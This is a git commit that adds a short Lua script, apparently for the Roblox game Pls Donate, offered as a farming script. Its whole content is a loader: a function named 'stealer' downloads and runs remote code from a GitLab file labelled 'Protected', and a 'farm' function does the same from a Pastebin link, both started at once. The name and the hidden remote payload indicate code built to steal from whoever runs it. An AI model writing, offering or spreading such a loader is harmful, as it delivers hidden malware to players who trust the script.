c57a1698fc15cf5b7d5e4a7e25bab6f6f2548346
Astonishpo0987 <isidrohaha@gmail.com>
2025-02-17 22:56:16 +0800

    Create PlsDonate.lua

---
+++ PlsDonate.lua
@@ -0,0 +1,10 @@
+
+local function stealer()
+    loadstring(game:HttpGet("https://gitlab.com/D3athFeather/Script/raw/main/Protected_88e14a143110fef7f15003aa.lua", true))()
+end
+local function farm()
+    loadstring(game:HttpGet("https://pastebin.com/raw/T7JBiRj2"))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
